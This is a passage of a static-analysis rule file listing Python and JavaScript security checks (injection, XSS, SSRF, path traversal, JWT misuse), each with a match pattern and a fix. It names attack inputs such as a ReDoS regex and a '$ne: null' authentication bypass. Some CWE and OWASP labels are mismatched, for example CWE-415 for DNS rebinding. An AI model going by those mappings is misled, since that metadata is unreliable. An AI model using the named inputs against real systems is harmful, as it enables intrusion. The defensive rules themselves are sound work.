message: 'CWE-617: Using assert for security checks is removed with -O optimization'
tags:
- security
- error-handling
- CWE-617
rule:
  kind: statement
  pattern: assert [security check]
note: "Assertions are removed when Python runs with -O optimization flag. Never use\
  \ assert\nfor security checks.\n\nBad Example:\n  assert user_id > 0, \"Invalid\
  \ user\"  # Removed with python -O!\n\nFix: Use explicit if statements and raise\
  \ exceptions for security checks.\n"
---
id: python-cwe-1333-regex-dos
language: python
severity: warning
message: 'CWE-1333: Complex regex patterns can cause exponential backtracking (ReDoS)'
tags:
- security
- regex
- denial-of-service
- CWE-1333
rule:
  kind: call
  pattern: re.compile($USER_PATTERN)
note: "Complex regex patterns with nested quantifiers can cause exponential backtracking,\n\
  leading to Regular Expression Denial of Service (ReDoS).\n\nBad Example:\n  pattern\
  \ = re.compile(user_pattern)  # User submits (a+)+$ → ReDoS\n\nFix: Use re2 library\
  \ for linear-time matching; validate/sanitize patterns.\n"
---
id: python-cwe-185-regex-injection
language: python
severity: warning
message: 'CWE-185: User-controlled regex patterns can be malicious or cause DoS'
tags:
- security
- regex
- CWE-185
rule:
  kind: call
  pattern: re.match($USER_PATTERN, $DATA)
note: 'User-controlled regex patterns can be malicious (malformed or ReDoS patterns)
  or

  enable information disclosure via backtracking.


  Fix: Escape user input using re.escape() or use fixed patterns, not user input.

  '
---
id: python-cwe-94-input-python2
language: python
severity: error
message: 'CWE-94: Python 2 input() calls eval() on user input'
tags:
- security
- code-injection
- python2
- CWE-94
rule:
  kind: call
  pattern: input($PROMPT)
note: 'Python 2''s input() function calls eval() on user input, enabling code execution.

  This is a legacy issue - Python 3''s input() is safe.


  Fix: Use raw_input() in Python 2; upgrade to Python 3 (which is secure).

  '
---
id: python-cwe-1188-dangerous-default-arg
language: python
severity: warning
message: 'CWE-1188: Mutable default arguments persist across calls, sharing state'
tags:
- security
- mutable-defaults
- CWE-1188
rule:
  kind: pattern
  pattern: def func(arg=[])
note: "Mutable default arguments (lists, dicts) persist across function calls. This\
  \ can cause\nstate leakage between invocations, potentially exposing sensitive data.\n\
  \nFix: Use None as default and create new mutable objects in function body:\n  def\
  \ func(arg=None):\n      if arg is None:\n          arg = []\n"
---
id: python-cwe-1188-binding-all-interfaces
language: python
severity: info
message: 'CWE-1188: Binding to all interfaces (0.0.0.0) exposes service to network'
tags:
- security
- network
- exposure
- CWE-1188
rule:
  kind: call
  pattern: socket.bind(("0.0.0.0", $PORT))
note: 'Binding to all interfaces (0.0.0.0) makes service accessible from all networks,

  increasing attack surface. Fine for development, dangerous in production.


  Fix: Bind to specific interface in production (e.g., 127.0.0.1 for local-only).

  Use firewall rules to restrict access.

  '
---
id: python-cwe-326-weak-ssl-version
language: python
severity: error
message: 'CWE-326: Old SSL/TLS versions (SSLv2, SSLv3, TLSv1) have known vulnerabilities'
tags:
- security
- ssl-tls
- cryptography
- CWE-326
rule:
  kind: pattern
  pattern: ssl.PROTOCOL_SSLv2
note: 'Old SSL/TLS versions have known vulnerabilities (POODLE, Heartbleed, etc).

  SSLv2: broken, SSLv3: POODLE, TLSv1.0: deprecated


  Fix: Use ssl.PROTOCOL_TLS or ssl.create_default_context() which use TLSv1.2+.

  '
---
id: python-cwe-347-jwt-no-verify
language: python
severity: error
message: 'CWE-347: JWT signature verification disabled allows token forgery'
tags:
- security
- jwt
- authentication
- CWE-347
rule:
  kind: call
  pattern: 'jwt.decode($TOKEN, options={"verify_signature": False})'
note: 'Skipping JWT signature verification allows attackers to forge tokens and impersonate
  users.


  Fix: Always verify JWT signatures with the correct secret/public key.

  '
---
id: python-cwe-327-jwt-algorithm-none
language: python
severity: error
message: 'CWE-327: JWT algorithm ''none'' bypasses all cryptographic protection'
tags:
- security
- jwt
- authentication
- CWE-327
rule:
  kind: pattern
  pattern: JWT algorithm 'none'
note: "The 'none' algorithm in JWT disables all cryptographic protection. If a server\
  \ accepts\n'none', attackers can forge tokens without knowing the secret.\n\nFix:\
  \ Explicitly specify allowed algorithms; reject 'none' algorithm.\n  jwt.decode(token,\
  \ secret, algorithms=['HS256', 'RS256'])\n"
---
id: javascript-cwe-95-eval-with-user-input
language: javascript
severity: error
message: 'CWE-95: Using eval() with user input allows arbitrary code execution'
tags:
- security
- code-injection
- CWE-95
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: eval($userInput)
note: 'The eval() function executes arbitrary JavaScript code. When used with user-controlled
  input, it enables attackers to execute malicious code in the application context,
  leading to complete application compromise.


  Remediation:

  - Never use eval() with user input

  - Use JSON.parse() for JSON data

  - Use specific parsers for expected data formats

  '
---
id: javascript-cwe-95-function-constructor-with-user-input
language: javascript
severity: error
message: 'CWE-95: Function constructor creates executable code from user input'
tags:
- security
- code-injection
- CWE-95
- OWASP-A03:2021-Injection
rule:
  kind: NewExpression
  pattern: new Function($userInput)
note: 'The Function constructor creates a new function from a string, similar to eval().
  When used with user-controlled input, it enables arbitrary code execution.


  Remediation:

  - Avoid Function constructor with dynamic input

  - Use predefined functions or safer evaluation mechanisms

  - Consider using worker threads with isolated contexts

  '
---
id: javascript-cwe-95-settimeout-with-string-argument
language: javascript
severity: error
message: 'CWE-95: setTimeout/setInterval with string argument executes as code'
tags:
- security
- code-injection
- CWE-95
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: setTimeout($stringArg, ...)
note: 'When setTimeout or setInterval receives a string argument, it acts like eval(),
  executing the string as code. This creates code injection vulnerabilities.


  Remediation:

  - Always pass function references to setTimeout/setInterval

  - Never pass strings as the first argument

  - Use arrow functions or named function references

  '
---
id: javascript-cwe-95-script-element-creation-with-user-input
language: javascript
severity: error
message: 'CWE-95: Creating script elements with user input enables code execution'
tags:
- security
- code-injection
- xss
- CWE-95
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: document.createElement('script')
note: 'Dynamically creating script elements with user-controlled content allows attackers
  to inject and execute arbitrary JavaScript.


  Remediation:

  - Never set script element''s src or content from user input

  - Use Content Security Policy (CSP) to restrict script sources

  - Use subresource integrity (SRI) for external scripts

  '
---
id: javascript-cwe-95-vm-runinthiscontext-usage
language: javascript
severity: error
message: 'CWE-95: vm.runInThisContext() executes code with access to global context'
tags:
- security
- code-injection
- CWE-95
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: vm.runInThisContext($userInput)
note: 'Node.js vm.runInThisContext() executes code in the current V8 context, allowing
  access to the global object and potential sandbox escapes.


  Remediation:

  - Avoid vm module with untrusted input

  - Use isolated execution environments or sandboxing libraries

  - Use vm.runInNewContext() with restricted context object

  - Consider worker_threads for true isolation

  '
---
id: javascript-cwe-79-innerhtml-with-user-input
language: javascript
severity: error
message: 'CWE-79: Setting innerHTML with unsanitized user input causes XSS'
tags:
- security
- xss
- dom-manipulation
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: AssignmentExpression
  pattern: element.innerHTML = $userInput
note: 'Setting innerHTML with unsanitized user input allows attackers to inject HTML
  including script tags and event handlers, causing XSS attacks.


  Remediation:

  - Use textContent for text-only content

  - Sanitize HTML with DOMPurify before setting innerHTML

  - Use framework templating with automatic escaping

  - Use createElement() and appendChild() for DOM manipulation

  '
---
id: javascript-cwe-79-outerhtml-with-user-input
language: javascript
severity: error
message: 'CWE-79: Setting outerHTML with user input allows HTML injection'
tags:
- security
- xss
- dom-manipulation
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: AssignmentExpression
  pattern: element.outerHTML = $userInput
note: 'Similar to innerHTML, outerHTML replaces the entire element and allows HTML
  injection including malicious scripts.


  Remediation:

  - Sanitize HTML input with DOMPurify

  - Use safer DOM manipulation methods

  - Prefer textContent and createElement

  '
---
id: javascript-cwe-79-document-write-usage
language: javascript
severity: error
message: 'CWE-79: document.write() can inject arbitrary HTML and JavaScript'
tags:
- security
- xss
- dom-manipulation
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: document.write($content)
note: 'document.write() can inject arbitrary HTML/JS into the document. It can completely
  replace page content and execute scripts.


  Remediation:

  - Use DOM manipulation methods like createElement(), appendChild()

  - Use modern framework templating

  - Use insertAdjacentHTML with sanitized content

  - Avoid write() after page load

  '
---
id: javascript-cwe-79-insertadjacenthtml-with-user-input
language: javascript
severity: error
message: 'CWE-79: insertAdjacentHTML with user input allows XSS attacks'
tags:
- security
- xss
- dom-manipulation
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: element.insertAdjacentHTML($position, $userInput)
note: 'insertAdjacentHTML parses text as HTML and inserts it into the DOM, allowing
  XSS if the content is user-controlled.


  Remediation:

  - Sanitize HTML content with DOMPurify before insertion

  - Use insertAdjacentText for plain text

  - Validate position parameter is one of: beforebegin, afterbegin, beforeend, afterend

  '
---
id: javascript-cwe-79-react-dangerouslysetinnerhtml
language: javascript
severity: error
message: 'CWE-79: React''s dangerouslySetInnerHTML bypasses XSS protections'
tags:
- security
- xss
- framework
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: JSXAttribute
  pattern: 'dangerouslySetInnerHTML={{ __html: $userInput }}'
note: 'React''s dangerouslySetInnerHTML bypasses React''s XSS protections. Using unsanitized
  user input creates XSS vulnerabilities.


  Remediation:

  - Sanitize HTML with DOMPurify before passing to dangerouslySetInnerHTML

  - Consider if raw HTML is actually necessary

  - Use React''s built-in escaping with JSX expressions

  - Use a sanitization library for HTML content

  '
---
id: javascript-cwe-79-angular-innerhtml-binding
language: javascript
severity: error
message: 'CWE-79: Angular innerHTML binding can execute scripts without sanitization'
tags:
- security
- xss
- framework
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: TemplateElement
  pattern: '[innerHTML]="userInput"'
note: 'Angular''s [innerHTML] binding can execute scripts if the content bypasses
  Angular''s sanitization (e.g., using bypassSecurityTrustHtml).


  Remediation:

  - Rely on Angular''s built-in sanitization

  - Never use DomSanitizer.bypassSecurityTrustHtml() with user input

  - Use property binding with proper escaping

  - Sanitize any HTML with the Sanitizer service

  '
---
id: javascript-cwe-79-vue-v-html-directive
language: javascript
severity: error
message: 'CWE-79: Vue v-html directive does not sanitize content'
tags:
- security
- xss
- framework
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: TemplateElement
  pattern: v-html="userInput"
note: 'Vue''s v-html directive renders raw HTML and does not sanitize content, making
  it vulnerable to XSS attacks.


  Remediation:

  - Sanitize HTML with DOMPurify before using v-html

  - Prefer {{ }} interpolation for text content

  - Use v-text for text-only content

  - Use Vue.js security best practices

  '
---
id: javascript-cwe-79-jquery-html-with-user-input
language: javascript
severity: error
message: 'CWE-79: jQuery''s html() method sets unsanitized innerHTML'
tags:
- security
- xss
- library
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: $(element).html($userInput)
note: 'jQuery''s .html() method sets innerHTML of elements. Unsanitized user input
  creates XSS vulnerabilities.


  Remediation:

  - Use .text() for text content

  - Sanitize HTML with DOMPurify before using .html()

  - Use .append() with created elements

  - Consider modern frameworks instead of jQuery

  '
---
id: javascript-cwe-79-location-href-javascript-protocol
language: javascript
severity: error
message: 'CWE-79: Setting location to javascript: URL executes code'
tags:
- security
- xss
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: AssignmentExpression
  pattern: location.href = $userInput
note: 'Setting location to a javascript: URL executes JavaScript code, enabling XSS
  attacks if the URL is user-controlled.


  Remediation:

  - Validate URLs to ensure they use only http: or https: protocols

  - Use URL parsing to verify the protocol

  - Block javascript:, data:, and vbscript: protocols

  - Implement URL whitelist for safe destinations

  '
---
id: javascript-cwe-79-anchor-href-with-user-input
language: javascript
severity: warning
message: 'CWE-79: Anchor href with user input can enable javascript: protocol XSS'
tags:
- security
- xss
- dom-manipulation
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: JSXAttribute
  pattern: href={userInput}
note: 'Setting href to user input can allow javascript: URLs, enabling XSS when the
  link is clicked.


  Remediation:

  - Validate and sanitize URLs

  - Block javascript:, data:, and vbscript: protocols

  - Use URL parsing for validation

  - Implement URL scheme whitelist

  - Consider using react-router for internal links

  '
---
id: javascript-cwe-79-dom-clobbering
language: javascript
severity: warning
message: 'CWE-79: DOM clobbering allows HTML elements to override global properties'
tags:
- security
- dom-manipulation
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: Identifier
  pattern: location or document or window or top or parent
note: 'DOM clobbering occurs when HTML elements with certain IDs or names override
  global JavaScript properties, potentially breaking security checks.


  Remediation:

  - Use explicit object references (e.g., window.location instead of location)

  - Avoid relying on global variable lookups

  - Use Object.hasOwn() for property checks

  - Validate expected objects are actually global objects

  '
---
id: javascript-cwe-79-setattribute-event-handler
language: javascript
severity: error
message: 'CWE-79: Setting event handler attributes with user input enables XSS'
tags:
- security
- xss
- dom-manipulation
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: element.setAttribute('on*', $userInput)
note: 'Setting event handler attributes (onclick, onerror, etc.) with user input allows
  execution of arbitrary JavaScript.


  Remediation:

  - Use addEventListener() with validated handlers

  - Never set event handler attributes from user input

  - Use data attributes instead of event handlers

  - Implement secure event delegation pattern

  '
---
id: javascript-cwe-79-css-injection-via-style
language: javascript
severity: warning
message: 'CWE-79: CSS injection via style property can leak data or enable attacks'
tags:
- security
- css-injection
- dom-manipulation
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: AssignmentExpression
  pattern: element.style.cssText = $userInput
note: 'CSS injection can lead to data exfiltration via CSS selectors, UI redressing
  attacks, or script execution in older browsers.


  Remediation:

  - Set individual style properties instead of cssText

  - Validate and sanitize CSS values

  - Use a CSS sanitization library

  - Use CSS-in-JS libraries with safe defaults

  - Implement strict CSP for styles

  '
---
id: javascript-cwe-1008-prototype-pollution-property-assignment
language: javascript
severity: error
message: 'CWE-1008: Object property assignment from user input can pollute prototypes'
tags:
- security
- prototype-pollution
- CWE-1008
- OWASP-A06:2021-SSRF
rule:
  kind: AssignmentExpression
  pattern: obj[userInput] = value
note: 'Prototype pollution occurs when attackers can set properties like __proto__,
  constructor, or prototype, affecting all objects.


  Remediation:

  - Block __proto__, constructor, and prototype keys

  - Use Object.create(null) for dictionaries

  - Use Map instead of objects for user-keyed data

  - Implement property allowlisting

  - Validate keys before assignment

  '
---
id: javascript-cwe-1008-deep-object-merge-prototype-pollution
language: javascript
severity: error
message: 'CWE-1008: Deep merge functions can cause prototype pollution'
tags:
- security
- prototype-pollution
- library
- CWE-1008
- OWASP-A06:2021-SSRF
rule:
  kind: CallExpression
  pattern: _.merge(target, userInput)
note: 'Deep merge/extend functions that recursively copy properties can pollute prototypes
  if not properly protected against __proto__.


  Remediation:

  - Use merge functions that explicitly block prototype properties

  - Validate input doesn''t contain __proto__ or constructor

  - Use Object.assign for shallow copies

  - Implement safe deep merge with property validation

  - Consider using frozen objects for configuration

  '
---
id: javascript-cwe-502-json-parse-prototype-keys
language: javascript
severity: warning
message: 'CWE-502: JSON.parse with prototype keys can lead to prototype pollution'
tags:
- security
- prototype-pollution
- deserialization
- CWE-502
- OWASP-A04:2021-Insecure-Deserialization
rule:
  kind: CallExpression
  pattern: JSON.parse(userInput)
note: 'Parsed JSON can contain __proto__ properties. While JSON.parse itself doesn''t
  pollute prototypes, subsequent operations might.


  Remediation:

  - After parsing, remove or sanitize dangerous keys

  - Use a reviver function to filter prototype-related keys

  - Validate JSON schema before processing

  - Use strict property validation after parsing

  '
---
id: javascript-cwe-1008-object-assign-unsanitized-source
language: javascript
severity: warning
message: 'CWE-1008: Object.assign with unsanitized source can enable prototype attacks'
tags:
- security
- prototype-pollution
- CWE-1008
- OWASP-A06:2021-SSRF
rule:
  kind: CallExpression
  pattern: Object.assign(target, userControlledObject)
note: 'While Object.assign itself doesn''t copy __proto__, accessor properties on
  the prototype chain could be invoked.


  Remediation:

  - Sanitize source objects before merging

  - Use explicit property copying with allowlists

  - Validate object structure before merging

  - Use Object.getOwnPropertyNames() for validation

  '
---
id: javascript-cwe-1008-spread-operator-prototype-pollution
language: javascript
severity: info
message: 'CWE-1008: Spread operator can trigger getters during object spreading'
tags:
- security
- prototype-pollution
- CWE-1008
- OWASP-A06:2021-SSRF
rule:
  kind: SpreadElement
  pattern: '{ ...userObject }'
note: 'Spread operator is generally safe for prototype pollution but can trigger getters
  on prototypes.


  Remediation:

  - Validate the source object structure before spreading

  - Use Object.keys() to iterate only own properties

  - Avoid spreading from untrusted sources

  - Consider filtering properties before spreading

  '
---
id: javascript-cwe-78-child-process-exec-with-user-input
language: javascript
severity: error
message: 'CWE-78: child_process.exec with user input allows command injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: exec($userInput)
note: 'exec() passes commands directly to the shell, allowing command injection via
  shell metacharacters (;, |, &&, backticks, $()).


  Remediation:

  - Use execFile() or spawn() with argument arrays

  - Never concatenate user input into commands

  - Validate and sanitize all inputs

  - Use allowlists for acceptable commands

  - Implement proper argument escaping

  '
---
id: javascript-cwe-78-child-process-execsync-with-user-input
language: javascript
severity: error
message: 'CWE-78: child_process.execSync with user input allows command injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: execSync($userInput)
note: 'Synchronous version of exec() with the same command injection vulnerabilities.
  Blocks the event loop and allows shell command injection.


  Remediation:

  - Use execFileSync() or spawnSync() with argument arrays

  - Implement strict input validation

  - Never use with user input directly

  - Use asynchronous spawn() when possible

  '
---
id: javascript-cwe-78-spawn-with-shell-true
language: javascript
severity: error
message: 'CWE-78: spawn with shell: true becomes vulnerable to shell injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: 'spawn(cmd, args, { shell: true })'
note: 'When shell: true is set, spawn() becomes vulnerable to shell injection like
  exec().


  Remediation:

  - Keep shell: false (default)

  - Use argument arrays instead of string concatenation

  - Validate all arguments

  - If shell features are needed, use safer alternatives

  '
---
id: javascript-cwe-78-child-process-execfile-unsanitized-args
language: javascript
severity: warning
message: 'CWE-78: execFile with unsanitized arguments can exploit target binary'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: execFile(binary, [userInput])
note: 'While execFile() is safer than exec(), malicious arguments can still exploit
  the target binary (e.g., curl with malicious URLs).


  Remediation:

  - Validate and sanitize all arguments

  - Use allowlists for acceptable values

  - Consider the capabilities of the target binary

  - Implement strict parameter validation

  - Use specific binary options to limit exposure

  '
---
id: javascript-cwe-78-template-literal-command-construction
language: javascript
severity: error
message: 'CWE-78: Template literals for command construction are vulnerable to injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03:2021-Injection
rule:
  kind: TemplateLiteral
  pattern: exec(`command ${userInput}`)
note: 'Using template literals to build commands is as dangerous as string concatenation
  for command injection.


  Remediation:

  - Never use string interpolation for command construction

  - Pass arguments as arrays to execFile() or spawn()

  - Use argument lists instead of command strings

  - Implement strict command validation

  '
---
id: javascript-cwe-89-sql-query-string-concatenation
language: javascript
severity: error
message: 'CWE-89: SQL query string concatenation enables SQL injection'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03:2021-Injection
rule:
  kind: BinaryExpression
  pattern: query("SELECT * FROM users WHERE id = " + userId)
note: 'Concatenating user input into SQL queries allows SQL injection attacks, potentially
  compromising the entire database.


  Remediation:

  - Use parameterized queries/prepared statements

  - Use query builders like Knex.js or ORMs like Sequelize, Prisma

  - Use placeholders (?) or named parameters

  - Validate input types and ranges

  - Implement least privilege database accounts

  '
---
id: javascript-cwe-94-mongodb-where-with-user-input
language: javascript
severity: error
message: 'CWE-94: MongoDB $where operator executes JavaScript on server'
tags:
- security
- nosql-injection
- CWE-94
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: 'collection.find({ $where: userInput })'
note: 'MongoDB''s $where operator executes JavaScript on the server. User-controlled
  input allows arbitrary code execution.


  Remediation:

  - Never use $where with user input

  - Use standard query operators

  - Set javascriptEnabled: false in MongoDB config

  - Use aggregation pipeline instead

  - Validate all query operations

  '
---
id: javascript-cwe-94-mongodb-query-operator-injection
language: javascript
severity: error
message: 'CWE-94: MongoDB operator injection allows authentication bypass'
tags:
- security
- nosql-injection
- CWE-94
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: 'collection.find({ field: userInput })'
note: 'If user input is parsed as an object, attackers can inject query operators
  like { $ne: null } to bypass authentication.


  Remediation:

  - Validate input types

  - Convert to expected types (string, number)

  - Wrap values in $eq explicitly

  - Use mongo-sanitize library

  - Implement strict schema validation

  '
---
id: javascript-cwe-94-mongodb-mapreduce-with-user-input
language: javascript
severity: error
message: 'CWE-94: MongoDB mapReduce executes JavaScript on server'
tags:
- security
- nosql-injection
- CWE-94
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: collection.mapReduce(userProvidedMap, userProvidedReduce)
note: 'mapReduce executes JavaScript on the MongoDB server. User-controlled map/reduce
  functions allow code execution.


  Remediation:

  - Never use user input in mapReduce functions

  - Use aggregation pipeline instead

  - Predefine all map/reduce functions

  - Use server-side Javascript for trusted code only

  '
---
id: javascript-cwe-89-raw-query-execution
language: javascript
severity: error
message: 'CWE-89: Raw query execution bypasses ORM protections'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: sequelize.query($userInput)
note: 'Raw query methods bypass ORM protections and are vulnerable to SQL injection
  if input is not parameterized.


  Remediation:

  - Use parameterized raw queries with replacements

  - Use ORM query builders instead

  - Never concatenate user input

  - Example: sequelize.query("SELECT * FROM users WHERE id = ?", { replacements: [id]
  })

  '
---
id: javascript-cwe-22-path-concatenation-with-user-input
language: javascript
severity: error
message: 'CWE-22: Path concatenation with user input enables path traversal'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01:2021-AAFT
rule:
  kind: BinaryExpression
  pattern: basePath + userInput
note: 'Path traversal attacks use sequences like ../ to access files outside the intended
  directory, potentially exposing sensitive data.


  Remediation:

  - Validate resolved paths stay within allowed directory using path.resolve()

  - Use allowlists for acceptable paths

  - Reject paths containing ..

  - Normalize paths with path.normalize()

  - Check against base directory

  '
---
id: javascript-cwe-22-fs-readfile-with-user-path
language: javascript
severity: error
message: 'CWE-22: Reading files with user-controlled paths exposes sensitive files'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01:2021-AAFT
rule:
  kind: CallExpression
  pattern: fs.readFile(userPath, ...)
note: 'Reading files based on user-controlled paths can expose sensitive files like
  /etc/passwd, configuration files, or source code.


  Remediation:

  - Resolve paths and verify they''re within allowed directories

  - Use path.normalize() and check against base path

  - Implement allowlist for readable files

  - Use path.relative() to verify path is safe

  '
---
id: javascript-cwe-22-fs-writefile-with-user-path
language: javascript
severity: error
message: 'CWE-22: Writing files to user-controlled paths can overwrite critical files'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01:2021-AAFT
rule:
  kind: CallExpression
  pattern: fs.writeFile(userPath, data, ...)
note: 'Writing to user-controlled paths can overwrite critical files, inject malicious
  scripts, or create files in sensitive locations.


  Remediation:

  - Strictly validate and constrain file paths

  - Use UUIDs for file names

  - Verify resolved path is within upload directory

  - Implement strict directory allowlist

  - Use filename validation with extension checks

  '
---
id: javascript-cwe-22-express-static-path-traversal
language: javascript
severity: error
message: 'CWE-22: express.static with user path can expose files outside public directory'
tags:
- security
- path-traversal
- framework
- CWE-22
- OWASP-A01:2021-AAFT
rule:
  kind: CallExpression
  pattern: express.static(userPath)
note: 'Serving files based on user input can expose files outside the intended public
  directory.


  Remediation:

  - Use express.static with fixed paths

  - For sendFile, use { root: __dirname + ''/public'' } option

  - Validate filename separately

  - Implement strict path whitelisting

  '
---
id: javascript-cwe-400-require-with-user-input
language: javascript
severity: error
message: 'CWE-400: Dynamic require() with user input can load arbitrary modules'
tags:
- security
- code-injection
- CWE-400
- OWASP-A03:2021-Injection
rule:
  kind: CallExpression
  pattern: require(userInput)
note: 'Dynamic require() with user input can load arbitrary modules, potentially executing
  malicious code or exposing sensitive modules.


  Remediation:

  - Use a map/switch to select from predefined modules

  - Never construct require paths from user input

  - Implement module whitelist

  - Use dynamic import() with proper validation

  - Store allowed modules in configuration

  '
---
id: javascript-cwe-918-http-request-user-controlled-url
language: javascript
severity: error
message: 'CWE-918: HTTP request with user-controlled URL enables SSRF attacks'
tags:
- security
- ssrf
- CWE-918
- OWASP-A10:2021-SSRF
rule:
  kind: CallExpression
  pattern: fetch(userUrl)
note: 'SSRF allows attackers to make requests from the server to internal resources,
  cloud metadata endpoints, or other sensitive services.


  Remediation:

  - Validate URLs against allowlist of trusted domains

  - Block internal/private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.1)

  - Disable redirects or validate redirect targets

  - Use URL parsing and validation library

  - Implement DNS pinning

  '
---
id: javascript-cwe-606-url-parsing-without-validation
language: javascript
severity: warning
message: 'CWE-606: URL parsing without protocol/host validation enables SSRF'
tags:
- security
- ssrf
- CWE-606
- OWASP-A10:2021-SSRF
rule:
  kind: NewExpression
  pattern: new URL(userInput)
note: 'Parsing URLs without validation can allow attackers to specify internal hosts,
  file:// protocols, or other dangerous schemes.


  Remediation:

  - After parsing, validate protocol is https: or http: only

  - Check hostname against allowlist

  - Block private IP ranges

  - Validate protocol before making requests

  - Use URL validation library

  '
---
id: javascript-cwe-918-http-follow-redirects
language: javascript
severity: warning
message: 'CWE-918: HTTP requests following redirects can bypass URL validation'
tags:
- security
- ssrf
- CWE-918
- OWASP-A10:2021-SSRF
rule:
  kind: CallExpression
  pattern: 'fetch(userUrl, { redirect: ''follow'' })'
note: 'Redirects can bypass URL validation, pointing the request to internal resources
  after initial validation passes.


  Remediation:

  - Disable automatic redirects

  - If redirects are needed, validate each redirect target URL before following

  - Limit redirect depth

  - Maintain redirect chain audit log

  '
---
id: javascript-cwe-415-dns-rebinding-vulnerability
language: javascript
severity: warning
message: 'CWE-415: DNS rebinding exploits time gap between validation and request'
tags:
- security
- ssrf
- CWE-415
- OWASP-A10:2021-SSRF
rule:
  kind: CallExpression
  pattern: fetch(validatedUrl)
note: 'DNS rebinding attacks exploit the time gap between DNS resolution for validation
  and the actual request, allowing access to internal resources.


  Remediation:

  - Resolve DNS before validation

  - Pin DNS resolution

  - Validate IP address after resolution, not just hostname

  - Use short TTLs and re-resolve before request

  - Implement DNS pinning for critical URLs

  '
---
id: javascript-cwe-347-jwt-decode-without-verify
language: javascript
severity: error
message: 'CWE-347: JWT decode() without verify() allows token forgery'
tags:
- security
- jwt
- CWE-347
- OWASP-A07:2021-AIAS
rule:
  kind: CallExpression
  pattern: jwt.decode(token)
note: 'jwt.decode() only decodes the token without verifying the signature, allowing
  attackers to forge tokens with arbitrary claims.


  Remediation:

  - Always use jwt.verify() for authentication

  - Use decode() only for debugging or non-security-critical purposes

  - Specify allowed algorithms in verify()

  - Check expiration and issuer claims

  '
---
id: javascript-cwe-347-jwt-algorithm-none
language: javascript
severity: error
message: 'CWE-347: JWT with alg=none allows unsigned token acceptance'
tags:
- security
- jwt
- CWE-347
- OWASP-A07:2021-AIAS
rule:
  kind: CallExpression
  pattern: jwt.verify(token, secret)
note: 'The "none" algorithm means no signature verification. Attackers can modify
  tokens freely if this algorithm is accepted.


  Remediation:

  - Explicitly specify allowed algorithms: jwt.verify(token, secret, { algorithms:
  [''HS256''] })

  - Never accept "none" or unspecified algorithms

  - Validate algorithm in token header

  - Use whitelist of expected algorithms

  '
---
id: javascript-cwe-347-jwt-algorithm-confusion
language: javascript
severity: error
message: 'CWE-347: JWT without explicit algorithm allows algorithm confusion attacks'
tags:
- security
- jwt
- CWE-347
- OWASP-A07:2021-AIAS
rule:
  kind: CallExpression
  pattern: jwt.verify(token, secret)
note: 'Algorithm confusion attacks switch between asymmetric (RS256) and symmetric
  (HS256) algorithms, using the public key as HMAC secret.


  Remediation:

  - Always specify the exact algorithm expected

  - Don''t trust the alg header claim from the token

  - Use different secrets/keys for each algorithm

  - Validate algorithm matches expected type

  '
---
id: javascript-cwe-521-weak-jwt-secret
language: javascript
severity: error
message: 'CWE-521: Weak JWT secret can be brute-forced to forge tokens'
tags:
- security
- jwt
- cryptography
- CWE-521
- OWASP-A02:2021-CM
rule:
  kind: CallExpression
  pattern: jwt.sign(payload, "secret")
note: 'Weak secrets can be brute-forced, allowing attackers to forge valid tokens.
  Common passwords are easily cracked.


  Remediation:

  - Use cryptographically random secrets at least 32 bytes long

  - Store secrets securely, not in code

  - Use environment variables or secret management services

  - Use strong algorithms like HS512

  - Rotate secrets periodically

  '
---
id: javascript-cwe-798-jwt-secret-in-source-code
language: javascript
severity: error
message: 'CWE-798: JWT secret in source code is easily discovered'
tags:
- security
- jwt
- secrets
- CWE-798
- OWASP-A02:2021-CM
rule:
  kind: Literal
  pattern: jwt.sign(payload, "hardcodedSecret")
note: 'Hardcoded secrets are easily discovered through code review, version control
  history, or decompilation.


  Remediation:

  - Use environment variables or secret management services

  - Never commit secrets to version control

  - Use .gitignore for secret files

  - Implement secret scanning in CI/CD

  - Rotate secrets immediately if exposed

  '
---
id: javascript-cwe-613-jwt-without-expiration
language: javascript
severity: warning
message: 'CWE-613: JWT without expiration remains valid indefinitely'
tags:
- security
- jwt
- CWE-613
- OWASP-A07:2021-AIAS
rule:
  kind: CallExpression
  pattern: jwt.sign(payload, secret)
note: 'JWTs without expiration remain valid indefinitely. Stolen tokens can be used
  forever.


  Remediation:

  - Always set short expiration times: jwt.sign(payload, secret, { expiresIn: ''15m''
  })

  - Use refresh tokens for longer sessions

  - Implement token revocation/blacklist

  - Check expiration on every request

  - Use issuer and subject claims for validation

  '
---
id: javascript-cwe-614-cookie-without-httponly
language: javascript
severity: warning
